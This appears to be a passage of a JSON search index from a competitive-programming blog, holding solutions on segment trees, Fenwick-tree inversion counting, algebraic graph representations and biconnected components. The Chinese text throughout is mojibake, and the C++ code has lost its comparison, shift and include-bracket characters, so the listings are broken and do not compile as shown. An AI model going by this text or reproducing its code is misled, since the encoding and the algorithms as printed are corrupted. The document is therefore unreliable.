å‡½æ•°ä¸­ï¼Œå› åˆå§‹æ—¶å‡ä¸º $0$ï¼Œæ‰€ä»¥æ¯æ®µåŒºé—´çš„ lã€r ä¸ mx çš„å€¼å‡ä¸º lenï¼Œå³ $r - l + 1$ï¼Œæœ‰ä»¥ä¸‹ä»£ç ï¼š void build (T tree[],int cur,int l,int r) tree[cur].l = tree[cur].r = tree[cur].mx = tree[cur].len = r - l + 1; if (l == r) return ; int mid = (l + r) 1; build (tree,cur 1,l,mid); build (tree,cur 1 | 1,mid + 1,r); pushup (tree,cur);//è¿™ä¸ªåœ¨æ¥ä¸‹å»è®² åœ¨ modify å‡½æ•°ä¸­ï¼Œç”±é¢˜å¯çŸ¥æ˜¯ä¸€ä¸ªå•ç‚¹çš„ä¿®æ”¹ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨ $l = r$ ä¹‹æ—¶æŠŠè¯¥ç‚¹çš„å€¼æ”¹ä¸º $1$ï¼Œè¡¨ç¤ºå·²è¢«åˆ‡å‰²å°±å¯ä»¥äº†ã€‚åŒæ—¶ï¼Œè¯¥åŒºé—´çš„ lã€r ä¸ mx å› æ•°å€¼çš„å˜åŒ–å‡ä¼šå˜ä¸º $0$ã€‚ä»£ç å¦‚ä¸‹ï¼š void modify (T tree[],int cur,int l,int r,int x) if (l == r x == l) tree[cur].l = tree[cur].r = tree[cur].mx = 0;//å·²è¢«åˆ‡å‰²ï¼Œæ­¤ç‚¹å˜ä¸º 1ï¼Œæ•…è¯¥ç‚¹çš„ 0 ä¸ªæ•°å‡æ›´æ–°ä¸º 0 return ; int mid = (l + r) 1; if (x = mid) modify (tree,cur 1,l,mid,x); else modify (tree,cur 1 | 1,mid + 1,r,x); pushup (tree,cur); æœ€åæ¥è®² pushup å‡½æ•°ï¼Œæ¯ä¸ªåŒºé—´åœ¨æ›´æ–°åé™¤é•¿åº¦ä¸ä¼šæ”¹å˜å¤–å…¶ä½™å‡æœ‰å˜åŠ¨ã€‚é¦–å…ˆæ˜¯ l çš„å€¼ï¼Œåˆ†ä¸¤ç§æƒ…å†µï¼Œè‹¥ä»å·¦ç«¯ç‚¹æœ€é•¿ $0$ çš„ä¸ªæ•°ä¸åŒºé—´é•¿åº¦ç›¸ç­‰ï¼Œåˆ™è¯´æ˜æ­£ä¸€æ®µåŒºé—´å‡ä¸º $0$ï¼Œå› æ­¤å¯ä»¥æ›´æ–°è‡³å³åŒºé—´çš„å·¦ç«¯ $0$ æ‰€èƒ½è¾¾åˆ°çš„æœ€è¿œä¹‹å¤„ï¼Œç›¸åŠ å³å¯ï¼›å¦åˆ™å°±æ˜¯å·¦ç«¯ç‚¹çš„ l çš„å€¼ã€‚r çš„å€¼åŒç†åˆ†ä¸¤ç§æƒ…å†µï¼Œä¸å†èµ˜è¿°ã€‚åŒæ—¶ï¼Œéœ€è¦æ›´æ–°åŒºé—´ mxï¼Œæ˜“å¾—æœ‰ä¸‰ç§æƒ…å†µï¼Œåˆ†åˆ«ä¸ºå·¦ç«¯ç‚¹å¼€å§‹æœ€é•¿çš„ $0$ çš„ä¸ªæ•°ï¼Œå³ç«¯ç‚¹å¼€å§‹æœ€é•¿çš„ $0$ çš„ä¸ªæ•°ä»¥åŠåºåˆ—ä¸­é—´æœ€é•¿çš„ $0$ çš„ä¸ªæ•°ï¼Œä¸‰è€…å–æœ€å€¼å°±èƒ½æ›´æ–°ç­”æ¡ˆäº†ã€‚ä»£ç å¦‚ä¸‹ï¼š void pushup (T tree[],int cur) if (tree[cur 1].l == tree[cur 1].len) tree[cur].l = tree[cur 1].len + tree[cur 1 | 1].l; else tree[cur].l = tree[cur 1].l; if (tree[cur 1 | 1].r == tree[cur 1 | 1].len) tree[cur].r = tree[cur 1 | 1].len + tree[cur 1].r; else tree[cur].r = tree[cur 1 | 1].r; tree[cur].mx = max (tree[cur 1].mx,max (tree[cur 1 | 1].mx,tree[cur 1].r + tree[cur 1 | 1].l));//ä¸‰æ®µå–æœ€å€¼ æœ€åç»™å‡ºä¸»å‡½æ•°ï¼ŒæŸ¥è¯¢å³ä¸ºä¸‹æ ‡ä¸º $1$ çš„çº¿æ®µæ ‘çš„æ•°ç»„çš„ mx å€¼ï¼Œä½†è¿”å›çš„ç­”æ¡ˆè®°å¾— $+1$ï¼Œç”»ä¸€ä¸‹å›¾å°±èƒ½æ‚Ÿäº†å“¦ï¼ int main () m = read ();n = read ();q = read (); build (tree_l,1,1,n - 1);build (tree_h,1,1,m - 1); while (q--) char x;int num; scanf (%c,x);num = read (); if (x == H) modify (tree_l,1,1,n - 1,n - num);//è·ç¦»åº•éƒ¨ else modify (tree_h,1,1,m - 1,num);//è·ç¦»å·¦ç«¯ ll da = tree_h[1].mx + 1,db = tree_l[1].mx + 1;//åˆ«å¿˜äº† printf (%lld ,da * db); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šUVA11858 Frosh Week","path":"/2021/07/25/UVA11858/","content":"é¢˜ç›®å°±æ˜¯æ±‚å¤šç»„æ•°æ®çš„é€†åºå¯¹ã€‚å¯¹äºæ¯ç»„æ•°æ®ï¼Œ$n$ çš„èŒƒå›´è¾ƒå¤§ï¼Œä¸º $1 \\le n \\le 10^6$ã€‚è€Œæ±‚é€†åºå¯¹ï¼Œå°±éœ€è¦æ ‘çŠ¶æ•°ç»„åŠ ä¸Šç¦»æ•£åŒ–ã€‚ ç¦»æ•£åŒ–å°±æ˜¯æŠŠæ— é™ç©ºé—´ä¸­æœ‰é™çš„ä¸ªä½“æ˜ å°„åˆ°æœ‰é™çš„ç©ºé—´ä¸­å»ï¼Œè¿™æ ·å³ä½¿ $a_i$ è¾ƒå¤§ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´ $\\texttt{MLE}$ã€‚ é¦–å…ˆæŠŠç”¨ $a_i$ è®°å½•è¾“å…¥çš„æ•°ï¼Œ$b_i$ è®°å½•ç¼–å· $i$ï¼Œç„¶åæ ¹æ® $a_i$ çš„å¤§å°å°† $b$ æ•°æ®è¿›è¡Œæ’åºã€‚è¿™æ ·ï¼Œè¾ƒå¤§çš„æ•°å°±ç”±ç¼–å·è¿›è¡Œæ›¿ä»£äº†ã€‚ for(register ll i = 1;i = n;++i) scanf(%lld,a[i]),b[i] = i;sort(b + 1,b + 1 + n,cmp);//ç¦»æ•£åŒ– for(register ll i = 1;i = n;++i) a[b[i]] = i;bool cmp(ll x,ll y) if(a[x] == a[y]) return x y; return a[x] a[y]; æ ‘çŠ¶æ•°ç»„å…·ä½“çš„å†™æ³•è§ ã€æ¨¡æ¿ã€‘æ ‘çŠ¶æ•°ç»„ 1ï¼Œåœ¨æ­¤ä»‹ç»å¦‚ä½•ç»Ÿè®¡é€†åºå¯¹çš„ä¸ªæ•°ã€‚ å¯¹äºç¼–å·ä¸º $i$ çš„æ•°ï¼Œè‹¥æ˜¯è¦æ„æˆé€†åºå¯¹ï¼Œåˆ™éœ€è¦æ‰¾åˆ°ç¼–å·ä¸º $1$ è‡³ $i - 1$ ä¸”æ¯” $a_i$ å¤§çš„æ•°æ‰è¡Œã€‚æ¯æ¬¡åŠ å‘æ ‘çŠ¶æ•°ç»„èƒ½æ–°åŠ æ•°ä¹‹å‰å…ˆæŸ¥è¯¢æ¯”å°†è¦åŠ å…¥çš„æ•°å¤§çš„ä¸ªæ•°ï¼Œäºæ˜¯éå† $1$ è‡³ $n$ åï¼Œä¸ªæ•°ç›¸åŠ çš„å’Œå°±æ˜¯é€†åºå¯¹çš„ä¸ªæ•°äº†ã€‚å› æ­¤æœ‰å¦‚ä¸‹ä»£ç ï¼š ans += i - 1 - find(a[i]);//æ ‘çŠ¶æ•°ç»„çš„å…ƒç´ ä¸ªæ•°å‡å»æ ‘çŠ¶æ•°ç»„ä¸­å°äºè¯¥æ•°çš„æ•°å³ä¸ºç­”æ¡ˆadd(a[i]);//å°†æ–°æ•°åŠ å…¥æ ‘çŠ¶æ•°ç»„ä¸­ å®Œæ•´ä»£ç #include iostream#include algorithm#include cstring#include cstdio#define ll long long#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAX = 1e6 + 50;ll a[MAX],b[MAX],c[MAX],n,ans;int t;bool cmp(ll x,ll y);ll lowbit(ll x);ll find(ll x);void add(ll x);int main() while (scanf(%d,n) != EOF) init (a);init (b);init (c);ans = 0; for(register ll i = 1;i = n;++i) scanf(%lld,a[i]),b[i] = i; sort(b + 1,b + 1 + n,cmp);//ç¦»æ•£åŒ– for(register ll i = 1;i = n;++i) a[b[i]] = i; for(register ll i = 1;i = n;++i) ans += i - 1 - find(a[i]);//æ ‘çŠ¶æ•°ç»„çš„å…ƒç´ ä¸ªæ•°å‡å»æ ‘çŠ¶æ•°ç»„ä¸­å°äºè¯¥æ•°çš„æ•°å³ä¸ºç­”æ¡ˆ add(a[i]);//å°†æ–°æ•°åŠ å…¥æ ‘çŠ¶æ•°ç»„ä¸­ printf(%lld ,ans); return 0;bool cmp(ll x,ll y) if(a[x] == a[y]) return x y; return a[x] a[y];ll lowbit(ll x) return x (-x);ll find(ll x) ll num = 0; for(ll i = x;i = 1;i -= lowbit(i)) num += c[i]; return num;void add(ll x) for(ll i = x;i = n;i += lowbit(i)) ++c[i];","categories":["Solution"]},{"title":"é¢˜è§£ï¼šB3600 [å›¾è®ºä¸ä»£æ•°ç»“æ„ 101] å›¾çš„ä»£æ•°è¡¨ç¤º","path":"/2021/07/08/B3600/","content":"Update on 2021.07.10ï¼šä¿®æ”¹äº†é¢˜è§£ä¸­å…³è”çŸ©é˜µã€æ— æƒå›¾ã€‘ éƒ¨åˆ†çš„é”™è¯¯ã€‚ è¿™é“é¢˜ç›®éœ€è¦æå¤§çš„è€å¿ƒä»¥åŠç»†å¿ƒç¨‹åº¦ï¼Œä½†æ˜¯æ€ç»´éš¾åº¦ä¸å¤§ï¼ŒæŒ‰ç…§é¢˜æ„æ¨¡æ‹Ÿå³å¯ã€‚ã€æ³¨ï¼šæœ¬é¢˜è§£æ‰€æœ‰å†…å®¹æ¶‰åŠçš„å›¾ç‰‡è§æ–‡ç« åº•éƒ¨ã€‚å›¾ç‰‡çš„åœˆä¸­çš„é»‘è‰²æ•°å­—ä¸ºç»“ç‚¹ç¼–å·ï¼Œè¾¹ä¸Šçš„ç´«è‰²æ•°å­—ä¸ºè¾¹ç¼–å·ï¼Œè¾¹ä¸Šçš„é»‘è‰²æ•°å­—ä¸ºè¾¹æƒã€‚ã€‘ å‰ç½®è®¾è¾“å…¥çš„ä¸€æ¡è¾¹ä¸º $(u,v)$ï¼Œ$dis[u][v]$ ä¸ºéé›¶æ—¶å³æœ‰è¿è¾¹ã€‚ åˆ¤æ–­é‡è¾¹ï¼šif (dis[u][v]) chong = 1;//diséé›¶ï¼Œè¯´æ˜å‡ºç°é‡è¾¹ï¼›åˆ¤æ–­è‡ªç¯ï¼šif (u == v) itself = 1;//è¯´æ˜æ˜¯è‡ªç¯ã€‚ é‚»æ¥çŸ©é˜µã€æ— æƒå›¾ã€‘é‚»æ¥çŸ©é˜µè¡¨ç¤ºç»“ç‚¹ä¹‹é—´çš„é‚»æ¥å…³ç³»ã€‚è¯¥çŸ©é˜µæ˜¯ç”± $n \\times n$ çš„å¸ƒå°”æ•°ç»„ç»„æˆï¼Œè‹¥ $G[i,j] = 1$ï¼Œåˆ™è¡¨ç¤ºä¸€æ¡ $i$ è‡³ $j$ çš„è¾¹ï¼›è‹¥ $G[i,j] = 0$ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä¸€æ¡ $i$ è‡³ $j$ çš„è¾¹ã€‚å› æ­¤ä¸éš¾å‘ç°ï¼Œåœ¨æ— å‘å›¾çš„é‚»æ¥çŸ©é˜µä¸­ï¼Œæœ‰ $G[i,j] = G[j,i]$ã€‚ ç‰¹ç‚¹ï¼šå¯ä»¥è¡¨ç¤ºè‡ªç¯ï¼Œä½†æ— æ³•è¡¨ç¤ºé‡è¾¹ã€‚ å¦‚å›¾ä¸€ï¼Œè¿™æ˜¯ä¸€å¼ ç»“ç‚¹æ•°ä¸º $5$ çš„æ— å‘æ— æƒå›¾ï¼Œå°†å…¶è¡¨ç¤ºæˆé‚»æ¥çŸ©é˜µä¸ºï¼š \\left [ \\begin{matrix} 0&1&1&0&0\\\\ 1&0&1&0&1\\\\ 1&1&0&1&0\\\\ 0&0&1&0&1\\\\ 0&1&0&1&0\\\\ \\end{matrix} \\right ]å› æ­¤å¯ä»¥å¾—åˆ°ä»£ç ï¼š if (!ty_2) int u = read (),v = read (); if (!ty_1) dis[u][v] = dis[v][u] = 1;//æ— å‘å›¾ else dis[u][v] = 1;//æœ‰å‘å›¾for (int i = 1;i = n;++i)//çŸ©é˜µçš„æ‰“å° for (int j = 1;j = n;++j) printf (%d ,dis[i][j]); puts (); æƒçŸ©é˜µã€èµ‹æƒå›¾ã€‘ä¸é‚»æ¥çŸ©é˜µç›¸ä¼¼ï¼Œè¡¨ç¤ºç»“ç‚¹ä¹‹é—´çš„é‚»æ¥å…³ç³»ã€‚è¯¥çŸ©é˜µæ˜¯ç”± $n \\times n$ çš„æ•°ç»„ç»„æˆï¼Œè‹¥ $G[i,j] = d$ï¼Œåˆ™è¡¨ç¤ºä¸€æ¡ $i$ è‡³ $j$ çš„æƒå€¼ä¸º $d$ çš„è¾¹ï¼›è‹¥ $G[i,j] = 0$ï¼Œåˆ™è¡¨ç¤ºæ²¡æœ‰ä¸€æ¡ $i$ è‡³ $j$ çš„è¾¹ã€‚ ç‰¹ç‚¹ï¼šå¯ä»¥è¡¨ç¤ºè‡ªç¯ï¼Œä½†æ— æ³•è¡¨ç¤ºé‡è¾¹ã€‚ å¦‚å›¾äºŒï¼Œè¿™æ˜¯ä¸€å¼ ç»“ç‚¹æ•°ä¸º $5$ çš„æœ‰å‘èµ‹æƒå›¾ï¼Œå°†å…¶è¡¨ç¤ºæˆæƒçŸ©é˜µä¸ºï¼š \\left [ \\begin{matrix} 0&2&0&0&0\\\\ 0&0&3&0&0\\\\ 1&0&0&0&0\\\\ 0&0&5&0&1\\\\ 0&3&0&0&0\\\\ \\end{matrix} \\right ]ä»£ç ä¸é‚»æ¥çŸ©é˜µå¤§é¢˜ç›¸ä¼¼ï¼Œæ— éæŠŠ dis[u][v] = 1 æ”¹ä¸º dis[u][v] = dï¼Œæ•…ä¸å†èµ˜è¿°ã€‚ å…³è”çŸ©é˜µã€æ— æƒå›¾ã€‘å…³è”çŸ©é˜µè¡¨ç¤ºç»“ç‚¹ä¸è¾¹ä¹‹é—´çš„å…³è”å…³ç³»ã€‚è¯¥çŸ©é˜µæ˜¯ç”± $n \\times m$ çš„æ•°ç»„ç»„æˆï¼Œè®¾çŸ©é˜µä¸º $G$ï¼Œåˆ™æœ‰ $\\forall x \\in G,x \\in \\{1,0,-1\\}$ã€‚å¯¹äºæ— å‘å›¾ï¼Œè‹¥ $G[i,j] = 1$ï¼Œåˆ™ç‚¹ $i$ æ˜¯è¾¹ $j$ çš„ç«¯ç‚¹ï¼›å¯¹äºæœ‰å‘å›¾æ¥è¯´ï¼Œè‹¥ $G[i,j] = 1$ï¼Œåˆ™ç‚¹ $i$ æ˜¯è¾¹ $j$ çš„å§‹ç‚¹ï¼Œè‹¥ $G[i,j] = -1$ï¼Œåˆ™ç‚¹ $i$ æ˜¯è¾¹ $j$ çš„ç»ˆç‚¹ã€‚è‹¥ $G[i.j] = 0$ï¼Œåˆ™ç‚¹ $i$ ä¸è¾¹ $j$ ä¸ç›¸è¿ã€‚ ç‰¹ç‚¹ï¼šå¯ä»¥è¡¨ç¤ºé‡è¾¹ï¼Œä½†æ— æ³•è¡¨ç¤ºè‡ªç¯ã€‚ å¦‚å›¾ä¸€ï¼Œè¿™æ˜¯ä¸€å¼ ç»“ç‚¹æ•°ä¸º $5$ çš„æ— å‘æ— æƒå›¾ï¼Œå°†å…¶è¡¨ç¤ºæˆå…³è”çŸ©é˜µä¸ºï¼š \\left [ \\begin{matrix} 1&1&0&0&0&0\\\\ 1&0&1&1&0&0\\\\ 0&1&1&0&1&0\\\\ 0&0&0&0&1&1\\\\ 0&0&0&1&0&1\\\\ \\end{matrix} \\right ]ä»£ç å¦‚ä¸‹ï¼š int u = read (),v = read ();if (!ty_1) con[u][i] = con[v][i] = 1;//æ— å‘å›¾else con[u][i] = 1,con[v][i] = -1;//æœ‰å‘å›¾ä¸€ä¸ªä¸ºå§‹ç‚¹ï¼Œä¸€ä¸ªä¸ºç»ˆç‚¹for (int i = 1;i = n;++i)//å…³è”çŸ©é˜µçš„æ‰“å° for (int j = 1;j = m;++j) printf (%d ,con[i][j]); puts (); é‚»æ¥è¡¨é‚»æ¥è¡¨ç›¸å½“äºä¸€å¼ è¡¨ç¤ºç»“ç‚¹ç»“æ„çš„å•é“¾è¡¨ã€‚å¯¹äºä¸€å¼ å›¾ï¼Œç»“ç‚¹ $u$ çš„è¡¨çš„å…ƒç´  $v$ æ»¡è¶³ $dis[u][v] 0$ã€‚è‹¥ä¸ºèµ‹æƒå›¾ï¼Œåˆ™è¿˜è¦è®°å½• $u$ åˆ° $v$ çš„è¾¹æƒã€‚ ç‰¹ç‚¹ï¼šå¯ä»¥è¡¨ç¤ºé‡è¾¹ä¸è‡ªç¯ã€‚ å¦‚å›¾äºŒï¼Œè¿™æ˜¯ä¸€å¼ ç»“ç‚¹æ•°ä¸º $5$ çš„æœ‰å‘èµ‹æƒå›¾ï¼Œå°†å…¶è¡¨ç¤ºæˆé‚»æ¥è¡¨ä¸ºï¼š 2 23 31 13 5 5 12 3 å› ä¸ºæ¯ä¸ªç»“ç‚¹çš„è¡¨çš„å…ƒç´ ä¸ªæ•°ä¸ç¡®å®šï¼Œå› æ­¤å¯ä»¥ç”¨åŠ¨æ€æ•°ç»„ vector int name[MAX],quan[MAX]ã€‚ä»£ç å¾ˆç®€å•ï¼š if (!ty_2) int u = read (),v = read (); if (!ty_1) name[u].push_back (v),name[v].push_back (u);//æ— å‘å›¾ä¸¤ä¸ªç‚¹å‡åŠ å…¥ else name[u].push_back (v);//æœ‰å‘å›¾åªåŠ å•å‘çš„else int u = read (),v = read (),d = read (); if (!ty_1) name[u].push_back (v),name[v].push_back (u),quan[u].push_back (d),quan[v].push_back (d); //æ­¤æ—¶ä¸ºèµ‹æƒå›¾ï¼Œè¿˜éœ€è¦è®°å½•æƒå€¼ else name[u].push_back (v),quan[u].push_back (d);//æœ‰å‘å›¾åªåŠ å•å‘çš„//æ³¨æ„ï¼Œå¦‚æœæŸä¸ªèŠ‚ç‚¹çš„è¡¨çš„å…ƒç´ ä¸ªæ•°ä¸º 0ï¼Œä¹Ÿè¦å•ç‹¬è¾“å‡ºä¸€ä¸ªç©ºè¡Œï¼Œä¸èƒ½å¿½ç•¥ï¼ˆä¹‹å‰æ ·ä¾‹æœ‰è¯¯ï¼‰if (!ty_2)//æœ‰æ— èµ‹æƒçš„ä¸¤ç§æƒ…å†µ for (int i = 1;i = n;++i) for (int j = 0;j name[i].size ();++j) printf (%d ,name[i][j]); puts (); else for (int i = 1;i = n;++i) for (int j = 0;j name[i].size ();++j) printf (%d %d ,name[i][j],quan[i][j]); puts (); æ­£å‘è¡¨/é€†å‘è¡¨ä¸€ç§å‹ç¼©å‚¨å­˜çš„æ–¹å¼ï¼Œå¯ä»¥èŠ‚çœç©ºé—´ã€‚å‘é‡ $A$ è¡¨ç¤ºç»“ç‚¹ $u$ çš„ç›´æ¥åç»§ç»“ç‚¹åœ¨ $B$ ä¸­çš„é¦–åœ°å€(é€†å‘è¡¨åˆ™ä¸ºå‰é©±ç»“ç‚¹)ï¼Œå‘é‡ $B$ å‚¨å­˜ç»“ç‚¹ç¼–å·ï¼Œå‘é‡ $C$ å‚¨å­˜æƒå€¼ã€‚ å¦‚å›¾äºŒï¼Œè¿™æ˜¯ä¸€å¼ ç»“ç‚¹æ•°ä¸º $5$ çš„æœ‰å‘èµ‹æƒå›¾ï¼Œå°†å…¶è¡¨ç¤ºæˆæ­£å‘è¡¨/é€†å‘è¡¨ä¸ºï¼š //æ­£å‘è¡¨1 2 3 4 6 72 3 1 3 5 22 3 1 5 1 3//é€†å‘è¡¨1 2 4 6 6 73 1 5 2 4 41 2 3 3 5 1 è®¾ç»“ç‚¹ $u$ çš„é‚»æ¥è¡¨çš„å…ƒç´ ä¸ªæ•°ä¸º $x$ã€‚åˆ™æ­£å‘è¡¨çš„ä¸‰ä¸ªå‘é‡è®¡ç®—å¦‚ä¸‹ï¼šå¯¹äºå‘é‡ $A$ï¼Œé¦–å…ˆè§„å®š $A[1] = 1$ã€‚å¯¹äºç»“ç‚¹ $1$ è‡³ $n$ï¼Œ$A[i + 1] = A[i] + x_i$ã€‚å‘é‡ $B,C$ ä¾¿æ˜¯éå†é‚»æ¥è¡¨ä¸­æ‰€æœ‰å…ƒç´ å¹¶è®°å½•ç¼–å·(ä»¥åŠæƒå€¼)ã€‚ ä»£ç å¦‚ä¸‹ï¼š for (int i = 1;i = n;++i)//æ­£å‘è¡¨ zheng.push_back (zheng[zheng.size () - 1] + name[i].size ());//å‘é‡ A çš„è®¡ç®— for (int j = 0;j name[i].size ();++j) zn.push_back (name[i][j]);//å‘é‡ B è®°å½•ç»“ç‚¹ç¼–å· if (ty_2) zq.push_back (quan[i][j]);//å‘é‡ C è®°å½•æƒå€¼ å¯¹äºé€†å‘è¡¨æ¥è¯´ï¼Œæ­£å¥½ä¸æ­£å‘è¡¨ç›¸åã€‚åœ¨ä¸ºæœ‰å‘å›¾çš„å‰æä¸‹ï¼Œè¿›è¡Œåå‘è¿è¾¹ï¼Œå¦‚åŸæ¥ä¸º $u \\to v$ï¼Œå˜ä¸º $v \\to u$ã€‚ç„¶åæ ¹æ®åå‘è¾¹ï¼Œè¿›è¡Œä¸æ­£å‘è¡¨ç›¸åŒçš„æ“ä½œå³å¯ã€‚ å°¾å£°è¿™æ ·å°±å®Œæ•´åœ°è§£å†³äº†é¢˜ç›®çš„æ‰€æœ‰è¡¨ç¤ºæ–¹æ³•ã€‚åšè¯¥é¢˜ç›®æ—¶ï¼Œä¸€å®šè¦ä¸¥æ ¼æŒ‰ç…§é¢˜æ„è¾“å…¥è¾“å‡ºï¼Œåˆ©ç”¨å¥½ if è¯­å¥åˆ¤æ–­æ¯ä¸€å¼ è¡¨åœ¨ä¸åŒçš„æ•°æ®ä¸­æ˜¯å¦è¦è¾“å‡ºã€‚ æœ€åï¼Œå†æ¬¡æ„Ÿè°¢æ‚¨èƒ½çœ‹åˆ°ç»“å°¾ï¼ é™„æ–‡ä¸­å›¾å¦‚ä¸‹ï¼š å®Œæ•´ä»£ç æˆ³æ­¤é“¾æ¥ï¼šä»£ç ã€‚","categories":["Solution"]},{"title":"é¢˜è§£ï¼šB3610 [å›¾è®ºä¸ä»£æ•°ç»“æ„ 801] æ— å‘å›¾çš„å—","path":"/2021/07/05/B3610/","content":"æœ¬é¢˜æ±‚çš„æ˜¯ç‚¹åŒè¿é€šåˆ†é‡ã€‚è¿˜æ˜¯å…ˆè®²ä¸€ä¸‹æœ‰å…³çš„æ¦‚å¿µï¼š å‰²ç‚¹ï¼šåœ¨ä¸€ä¸ªæ— å‘è¿é€šå›¾ä¸­ï¼Œå¦‚æœåˆ é™¤æŸä¸ªç‚¹å’Œè¿™ä¸ªç‚¹å…³è”çš„æ‰€æœ‰è¾¹ï¼Œä½¿å‰©ä¸‹çš„å›¾ä¸å†è¿é€šçš„ç‚¹ã€‚ ç‚¹åŒè¿é€šå›¾ï¼šåœ¨ä¸€ä¸ªæ— å‘è¿é€šå›¾ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç‚¹ï¼Œè‹¥åˆ é™¤è¿™ä¸ªç‚¹å’Œè¿™ä¸ªç‚¹å…³è”çš„æ‰€æœ‰è¾¹åï¼Œå‰©ä¸‹çš„å›¾ä»èƒ½è¿é€šçš„å›¾ã€‚ ç‚¹åŒè¿é€šåˆ†é‡ï¼š åœ¨æ— å‘å›¾ $G$ ä¸­ï¼Œå¦‚æœä¸€ä¸ªç‚¹åŒè¿é€šå­å›¾ $Gâ€™$ ä¸æ˜¯ä»»ä½•ä¸€ä¸ªç‚¹åŒè¿é€šå­å›¾çš„çœŸå­é›†ï¼Œåˆ™å›¾ $Gâ€™$ ä¸ºå›¾ $G$ çš„æå¤§ç‚¹åŒè¿é€šå­å›¾ï¼Œå³ç‚¹åŒè¿é€šåˆ†é‡ã€‚ æ¥ä¸‹å»è®²è§£æ³•ï¼ˆä»¥ä¸‹ç”¨ dfn æ•°ç»„è®°å½•è®¿é—®æ¯ä¸ªç‚¹çš„æ—¶é—´ï¼Œç”¨ä¸€ä¸ª low(u) æ¥è¡¨ç¤º $u$ ä»¥åŠå…¶åä»£æœ€å¤šç»è¿‡ä¸€æ¡åå‘è¾¹èƒ½å›åˆ°çš„æœ€æ—©çš„æ—¶é—´æˆ³ï¼‰ã€‚ åœ¨ä¸€ä¸ªè¿é€šå›¾ä¸­ï¼Œè‹¥ç‚¹ $u$ ä¸ºæ ‘æ ¹ï¼Œå¯¹äºç‚¹ $u$ ï¼Œè‹¥å½“ä¸”ä»…å½“å®ƒæœ‰ä¸¤ä¸ªæˆ–è€…æ›´å¤šçš„å­ç»“ç‚¹æ—¶ï¼Œåˆ™å®ƒä¸ºå‰²ç‚¹ï¼›è‹¥ç‚¹ $u$ ä¸ºéæ ¹çš„ç»“ç‚¹ï¼Œåˆ™æœ‰å®šç†â€”åœ¨æ— å‘è¿é€šå›¾ $G$ çš„ DFS æ ‘ä¸­ï¼Œ$u$ æ˜¯ä¸ªå‰²ç‚¹å½“ä¸”ä»…å½“ $u$ å­˜åœ¨ä¸€ä¸ªå­ç»“ç‚¹ $v$ï¼Œä½¿å¾— $v$ åŠå…¶æ‰€æœ‰åä»£éƒ½æ²¡æœ‰åå‘è¾¹è¿å› $u$ çš„ç¥–å…ˆï¼ˆæ³¨æ„ï¼šä¸åŒ…æ‹¬ $u$ï¼‰ã€‚ åˆ™å½“ä¸€æ¡è¾¹ $(u,v)$ æœ‰ low[v] = dfn[u] æ—¶ $u$ ä¸ºå‰²ç‚¹ã€‚å°† low[u] æ›´æ–°æ—¶ï¼Œåˆ†ä¸ºæ ‘è¾¹ low[u] = min (low[u],dfn[u]) å’Œåå‘è¾¹ low[u] = min (low[u],dfn[v]) å³å¯ã€‚ è®°å½•ç‚¹åŒè¿é€šåˆ†é‡ä¹Ÿå¾ˆç®€å•ï¼Œé¦–å…ˆç”¨æ ˆå‹å…¥ä¿å­˜å…ƒç´ ï¼Œç­‰æ‰¾åˆ°å‰²ç‚¹åå†å¼¹å‡ºå¹¶ç”¨ set è®°å½•å°±è¡Œã€‚ä¸ºä»€ä¹ˆè¦ç”¨ setï¼ŸåŸå› å¾ˆç®€å•ï¼Œå°±æ˜¯å®ƒèƒ½ä¸é‡å¤ä¸”æœ‰åºçš„è®°å½•å…ƒç´ ã€‚ æœ€åéœ€è¦æ³¨æ„ä¸€ä¸‹è¾“å‡ºçš„å¤§å°é¡ºåºï¼Œç›´æ¥å¯¹ set åšä¸€æ¬¡ sort å³å¯è¾“å‡ºã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include set#include stack#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 1e9 + 7;int n,m,cnt,bcc_cnt,times;int dfn[MAX],low[MAX],bcc_in[MAX];int to[MAX 1],head[MAX 1],nxt[MAX 1];bool vis[MAX];set int bcc[MAX];stack pair int,int s;//ç”¨ pair è®°å½•ä¸€æ¡è¾¹çš„ u ä¸ vinline int read ();void _add (int u,int v);void dfs (int u,int fa);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = m;++i) int u = read (),v = read (); _add (u,v);_add (v,u);//åŒå‘è¾¹ï¼Œéœ€è¦æ³¨æ„æ•°ç»„çš„å¤§å° for (int i = 1;i = n;++i) if (!dfn[i]) dfs (i,-1);//å›¾ä¸ä¸€å®šè”é€šï¼Œéœ€å…¨éƒ¨éå† printf (%d ,bcc_cnt); sort (bcc + 1,bcc + 1 + bcc_cnt); for (int i = 1;i = bcc_cnt;++i) for (set int::iterator it = bcc[i].begin ();it != bcc[i].end ();++it) printf (%d ,*(it));//set çš„è¾“å‡ºéœ€è¦æ³¨æ„ puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void dfs (int u,int fa) dfn[u] = low[u] = ++times; int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) s.push (u,v); ++child; dfs (v,u); low[u] = min (low[u],low[v]); if (low[v] = dfn[u])//ä¸€ä¸ªå‰²ç‚¹å‡ºç°ï¼Œè®°å½•ä¸€ä¸ªç‚¹åŒè¿é€šåˆ†é‡ ++bcc_cnt; while (1) int x = s.top ().first,y = s.top ().second; s.pop (); bcc_in[x] = bcc_in[y] = bcc_cnt; bcc[bcc_cnt].insert (x); bcc[bcc_cnt].insert (y); if (x == u y == v) break; else if (dfn[v] dfn[u] v != fa)//ç‰¹æ®Šæƒ…å†µ s.push(u,v); low[u] = min (low[u],dfn[v]);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šB3609 [å›¾è®ºä¸ä»£æ•°ç»“æ„ 701] 